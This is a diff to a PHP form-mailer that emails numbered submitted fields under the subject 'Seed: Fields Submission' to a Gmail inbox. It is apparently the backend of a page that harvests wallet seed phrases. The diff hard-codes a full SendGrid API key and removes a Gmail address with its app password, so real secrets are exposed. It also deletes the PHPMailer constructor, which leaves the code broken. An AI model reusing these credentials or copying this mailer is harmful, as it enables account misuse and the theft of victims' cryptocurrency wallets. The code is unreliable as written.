@@ -50,18 +50,17 @@ foreach ($clean as $i => $v) {
 $body .= "</ol>";
 
 try {
-    $mail = new PHPMailer();
-    $mail->isSMTP();
-    $mail->SMTPAuth = true;
-    $mail->SMTPSecure = 'tls';
-    $mail->Host = 'smtp.gmail.com';
-    $mail->Port = 587;
+   $mail->isSMTP();
+$mail->Host = 'smtp.sendgrid.net';
+$mail->SMTPAuth = true;
+$mail->Username = 'zMJV7fiCQ32RfJApIN-9DA';  // literally 'apikey'
+$mail->Password = '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';  // paste your SendGrid key here
+$mail->SMTPSecure = 'tls';
+$mail->Port = 587;
 
-    // TODO: set your credentials here (use app password for Gmail)
-    $mail->Username = "jhnkenrick@gmail.com";  // Gmail login
-$mail->Password = "iclvtpqxcjdprtfh";      // Gmail App Password
-$mail->setFrom('jhnkenrick@gmail.com', 'Sender');  // MUST MATCH USERNAME
-$mail->addAddress('daptuba6896@gmail.com', 'Recipient');  // Receiver ok
+$mail->setFrom('daptuba6896@gmail.com', 'Sender');
+$mail->addAddress('daptuba6896@gmail.com', 'Recipient');
+
 
     $mail->isHTML(true);
     $mail->Subject = 'Seed: Fields Submission';
